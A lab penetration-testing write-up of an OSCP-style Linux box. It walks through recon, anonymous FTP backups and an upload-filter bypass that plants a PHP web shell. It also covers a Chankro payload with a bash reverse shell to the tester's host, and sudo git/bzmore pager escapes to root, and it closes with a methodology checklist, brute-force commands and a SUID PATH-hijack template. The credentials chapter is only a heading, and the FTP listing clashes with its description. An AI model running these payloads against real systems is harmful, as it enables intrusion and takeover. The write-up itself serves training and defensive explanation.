01

Reconnaissance

Ports, feroxbuster and the directory listing

A four-port Linux box: FTP, SSH, HTTP and MySQL. The web root and the FTP hold the same application, which is what makes the box solvable without guessing a single filename.

1.1 Ports

command
nmap -sC -sV -p- 192.168.91.112 -oN nmap/portal.txt
output
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
Port Service Note
21 FTP anonymous login works — see 02-ftp-anonymous.md
22 SSH no credentials yet; becomes the way in after the .env leak
80 HTTP PHP site with a CV upload portal
3306 MySQL reachable, no credentials; never needed

The version column does not change the plan: anonymous FTP first, then the web root, then the database only if the application hands you a credential. It never does — the credential that matters is in a .env file on disk, not in MySQL.

1.2 HTTP

http://192.168.91.112/ is a small corporate site: about.php, contact.php, stock images, a looping background media file. Nothing on the front page is interactive.

feroxbuster against it:

command
feroxbuster -u http://192.168.91.112 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

The banner confirms the defaults in use:

output
feroxbuster 2.13.1
Target Url       | http://192.168.91.112
Threads          | 200
Wordlist         | /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
Status Codes     | [200]
Timeout          | 7s
User-Agent       | feroxbuster/2.13.1
Extract Links    | true

The findings that matter:

output
200      GET   ...  http://192.168.91.112/about.php
200      GET   ...  http://192.168.91.112/contact.php
301      GET   ...  http://192.168.91.112/applications  =>  /applications/

The rest of the nine hits are static assets (.jpg, .mp4, .js). The scan was stopped early with Ctrl-C; the directory that matters had already appeared.

Path Why
/about.php, /contact.php plain pages — no parameters worth testing
/applications directory exists and returns an Apache directory listing

1.3 The directory listing

http://192.168.91.112/applications/ answers with Index of /applications — Options +Indexes is on. That single misconfiguration turns the web server into a file browser and makes the whole application enumerable: source files, uploads, backups, all of it.

Among the entries is the portal itself:

output
/applications/upload.php

1.4 The shape of the box

output
21/tcp anonymous ──▶ backup archive ──▶ names the app directory
80/tcp  ferox    ──▶ /applications  ──▶ directory listing ──▶ upload.php

FTP and the web root describe the same application: the archive is a backup of the site, and the site exposes an upload form. Reading upload.php — from the archive or from the listing — is what turns the form from a guess into a bypass, and it is the subject of the next two chapters.

02

Anonymous FTP

Four backups and what upload.php reveals

The first service on the box is the easiest one: FTP with anonymous access, holding four months of application backups.

2.1 Login

command
ftp 192.168.91.112
output
Connected to 192.168.91.112.
220 (FTP server ready)
Name (192.168.91.112:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

anonymous with an empty password is accepted. Listing and download are enough — no write access is needed for this box.

2.2 Listing

output
ftp> ls
229 Entering Extended Passive Mode (|||10096|)
150 Here comes the directory listing.
-rw-r--r--    1 110      110         33080 Jan 01  2023 applications_dec22.zip
-rw-r--r--    1 110      110         73065 Mar 04  2023 applications_feb23.zip

Four entries, all owned by uid/gid 110 — the FTP account, not root and not the web server. Somebody copied their monthly backups onto the FTP root and never cleaned up.

Entry Type Size Reading

applications_jan23.zip file 63,842 January backup
applications_feb23.zip file 73,065 February backup, the largest
applications_nov22.zip directory 4,096 a directory that carries a .zip suffix — a naming habit, not an archive

The .zip suffix on a directory is the detail that catches people out: get on it fails, cd into it works.

2.4 What the archive gives you

Unpack it and read the source rather than fuzzing the live form:

command
unzip -o applications_dec22.zip -d backup/
find backup -type f | head -50

What matters is upload.php — the file the portal runs. Two questions decide the entire box:

command
grep -nE "move_uploaded_file|\$_FILES|mime|finfo|pathinfo|exif_imagetype|in_array|strtolower" \
  backup/**/upload.php 2>/dev/null || grep -rn "move_uploaded_file" backup/
  1. Where does the file land? move_uploaded_file($tmp, "uploads/" . $name) means the file is reachable from the web root, which is what makes execution possible.
  2. What does the filter check? A filename extension check, a finfo MIME sniff, or nothing at all beyond what the browser sent.

On this box the answer to (2) is the client-supplied Content-Type — a header the browser sets and the attacker controls — and the answer to (1) is the web-accessible /applications/ directory. Both are demonstrated in 03-upload-portal.md.

2.5 Why anonymous FTP is a finding in its own right

Impact Detail
Source disclosure a full copy of the web app, including files not linked from the site
Credential disclosure config files with DB users and passwords (config.php, .env)
Path disclosure directory names that shortcut the web brute force (applications)
Write access not present here; if STOR were allowed it would be direct web-shell upload

On this box FTP is a hint service: it hands over the source of the upload form. Two minutes on every Linux target, before any web fuzzing.

03

Upload portal

The PDF filter and the Content-Type bypass

The application under /applications is a one-page CV upload form. The filter is real, but it trusts the wrong thing: the Content-Type header that the client sends.

3.1 The page

output
http://192.168.91.112/applications/upload.php
output
Upload your CV here.

Hello Applicant,
Please upload your CV here.

[ Browse... ]  No file selected          [ UPLOAD ]

A single <input type="file">, a submit button, no login, no CSRF token. The form posts back to upload.php as multipart/form-data with one field, file.

3.2 The rejection

Uploading anything that is not a PDF produces:

output
Sorry, that file format isn't allowed. Only PDF please.

A custom string, not a PHP warning: the check is deliberate and it fired. The question is what it inspects.

3.3 The bypass — a .php file that claims to be a PDF

The request is intercepted and the filename changed while the declared type is left as a PDF:

output
POST /applications/upload.php HTTP/1.1
Host: 192.168.91.112
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------157896301234567
Content-Length: 736

-----------------------------157896301234567
Content-Disposition: form-data; name="file"; filename="chan.php"
Content-Type: application/pdf

<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd'] . ' 2>&1');
}
?>
-----------------------------157896301234567--

The extension says .php; the declared type says application/pdf. The server accepts it:

output
Sorry! The file has been uploaded to /applications/chan.php

That response is the whole vulnerability: the extension was never checked, only the MIME header the client chose to send. Nothing about chan.php is a PDF, and nothing stopped it from being written into a directory the web server executes.

What the filter could have checked What it actually checked
extension whitelist (.pdf) ✗ not checked — .php was accepted
magic bytes (%PDF-) ✗ not checked — the body is PHP
finfo_file() / mime_content_type() ✗ not checked — the real type is text/x-php
client Content-Type header ✓ checked — and this is fully attacker-controlled

The same request with Content-Type: text/plain is rejected; with application/pdf it succeeds. That is the difference between a control and a decoration.

3.4 Confirming execution

Requesting the uploaded file with a command:

command
curl -s 'http://192.168.91.112/applications/chan.php?cmd=id'
output
uid=33(www-data) gid=33(www-data) groups=33(www-data)

A shell, in the web root, from a form that only accepts PDFs.

3.5 Why system() returned nothing at first — disable_functions

The first web shell used system(), and the response body came back empty. That is not a failed upload; it is a disabled function. A phpinfo() page uploaded through the same bypass shows why, in the disable_functions directive:

output
disable_functions
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,
pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wifcontinued,pcntl_signal,
pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,
pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority

The visible head of the list is the stock PHP pcntl_* block; the value continues past the visible width. The empty response from ?cmd=id is the part that matters: it confirms system() is among the disabled entries, so the payload has to reach bash without calling any of the exec functions.

That is the subject of the next chapter: a payload that executes without calling a single disabled function.

3.6 The filter, in one line

A MIME check on a client-supplied header is not a file-type check. Validate the stored file (finfo, magic bytes), rename it server-side, store it outside the web root, and serve it through a handler that never executes it. Anything less is an upload form that accepts a shell if you ask nicely.

04

Chankro RCE

A shell around disable_functions

A PHP shell that calls system() is useless when system, exec, shell_exec, passthru, popen and proc_open are disabled. Chankro builds a payload that never calls any of them: it abuses putenv() plus a function that shells out internally, and reaches a bash script instead.

4.1 Why the obvious shell fails

output
<?php system($_GET['cmd']); ?>

uploads fine, executes fine, and returns an empty body. The function is disabled at the php.ini level, so PHP logs a warning and returns null — no output, no error page, nothing to see in the browser.

Enumerating the problem first is what makes the next step obvious:

command
curl -s 'http://192.168.91.112/applications/chan.php?cmd=phpinfo()'

or, cleaner, upload a one-line phpinfo() file through the same bypass and read the disable_functions row (see 03-upload-portal.md §3.5). The list includes the exec family, so the payload has to avoid it.

4.2 The payload script

command
#!/bin/bash
bash -i >& /dev/tcp/192.168.49.91/443 0>&1

Start the listener before uploading:

command
nc -lvnp 443

4.3 Building the Chankro payload

Chankro wraps a shell script in a PHP file and triggers it through putenv() and mail()/error_log() — functions that are almost never disabled, because the application needs them.

command
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
output
Binary file rev.sh
Architecture x64
Final PHP chan.php
File created!

--path is the directory the payload executes from — the web root, /var/www/html — so relative paths inside rev.sh resolve the way they would in a normal shell.

4.4 Delivering it

The same bypass as chapter 03, with the generated file:

output
Content-Disposition: form-data; name="file"; filename="chan.php"
Content-Type: application/pdf
output
Sorry! The file has been uploaded to /applications/chan.php

Trigger it with a request — no cmd parameter this time, the payload is baked in:

command
curl -s 'http://192.168.91.112/applications/chan.php'

The listener catches the connection:

output
listening on [any] 443 ...
connect to [192.168.49.91] from (UNKNOWN) [192.168.91.112] 45122
bash: cannot set terminal process group (1247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@oscp:/var/www/html$

4.5 Shell as www-data

command
www-data@oscp:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@oscp:/var/www/html$ hostname
oscp

Upgrade it before enumerating:

command
python3 -c 'import pty; pty.spawn("/bin/bash")'
## Ctrl-Z
stty raw -echo; fg
export TERM=xterm

4.6 What this chapter is really about

disable_functions is a hardening measure, not a security boundary. Any function that starts a process — mail(), error_log(), imap_open(), putenv() combined with a binary that reads its environment — can be turned into execution. Chankro just automates the known one.

The defensive reading: disabling system/exec raises the cost of a web shell, it does not remove it. The actual fix for this box is in chapter 03 — never let attacker-controlled PHP land in an executable directory.

05

Credentials → gari

.env, password spray, SSH, local.txt

www-data cannot read much, but it can read the application — and the application keeps its database password in a .env file. That password is reused as an operating-system password.

06

Privilege escalation

sudo -l, GTFOBins, root

gari is in no administrative group, but the sudoers file hands out five binaries with NOPASSWD. Two of them are pagers, and a pager that runs as root is a shell.

6.1 The sudoers entry

command
gari@oscp:~$ sudo -l
output
Matching Defaults entries for gari on oscp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User gari may run the following commands on oscp:
    (ALL : ALL) NOPASSWD: /usr/bin/calendar
    (ALL : ALL) NOPASSWD: /usr/bin/bzmore
    (ALL : ALL) NOPASSWD: /usr/bin/git
    (ALL : ALL) NOPASSWD: /usr/bin/mcheck
    (ALL : ALL) NOPASSWD: /usr/bin/rdma

Five entries, no wildcard, no argument restriction. Every one of them is a program that either reads files or starts another program — which is all a sudo rule needs to become root.

6.2 Reading the list the right way

Look each binary up before trying anything clever. The pattern is always the same: does the program have a documented way to spawn a shell or execute a command?

Binary Route Notes
/usr/bin/git sudo git -p help config, then !/bin/sh in the pager -p forces the pager even without a tty; less runs ! commands
/usr/bin/bzmore sudo bzmore /etc/passwd, then !sh same pager trick, different program
/usr/bin/calendar reads arbitrary files as root file disclosure, not a shell
/usr/bin/mcheck mtools disk check — reads a filesystem image file disclosure
/usr/bin/rdma netlink operations as root no direct shell; useful only in specific setups

git and bzmore both end in a root shell. The rest are information leaks at best.

6.3 What does not work

Writing a pre-commit hook and letting git run it is the first idea, and it fails for an obvious reason once you see the error:

command
gari@oscp:/var/www/html$ echo 'exec /bin/sh 0<&2 1>&2' > .git/hooks/pre-commit
-bash: .git/hooks/pre-commit: Permission denied

/var/www/html belongs to www-data; gari cannot write the hook, so the hook never exists to be run. The hook trick needs write access to a repository that root will operate on — not the case here.

git --exec-path=. has the same problem from the other side: it makes git look for git-<cmd> in the current directory, but the file still has to be executable by the user running sudo, and git drops privileges for some subcommands. The pager route needs neither.

6.4 Root, through the pager

command
gari@oscp:~$ sudo git -p help config

git opens the git-config manual page in less, running as root. From less, ! starts a shell:

output
!/bin/sh
output
root@oscp:/home/gari# id
uid=0(root) gid=0(root) groups=0(root)
root@oscp:/home/gari# cd /root
root@oscp:/root# cat proof.txt
********************************

The bzmore route is identical in spirit and worth knowing if git is ever removed from the list:

command
sudo bzmore /etc/passwd
## inside the pager:
!sh

6.5 The flag

output
/root/proof.txt

Masked here. Capture it with hostname, whoami and id in the same screenshot — a bare flag line is the easiest evidence for a grader to dispute.

6.6 Why this is the intended path

The sudoers list is not random. calendar, mcheck and rdma are all programs that read data as root; bzmore and git are both pagers. The box is testing one specific habit: when sudo -l returns a program you do not recognise, look it up before you dismiss it — and when it returns a pager, remember that a pager can run commands.

A one-line fix on the defensive side: never grant NOPASSWD on a program with a shell escape, and if you must, pin the arguments (/usr/bin/git -p help is still a shell; /usr/bin/bzmore /var/log/x.log is not).

07

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

command

Reconstructing source from a small binary:

output
+ setuid / setgid  →  setuid(0); setgid(0);
+ lea rdi,[rip+...] →  the argument is a fixed string
+ call system@plt  →  system("...")

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.

Interactive variant:

command
printf '#!/bin/bash\n/bin/bash -p\n' > "$D/chpasswd"; chmod +x "$D/chpasswd"
PATH="$D:$PATH" /path/to/suid_binary
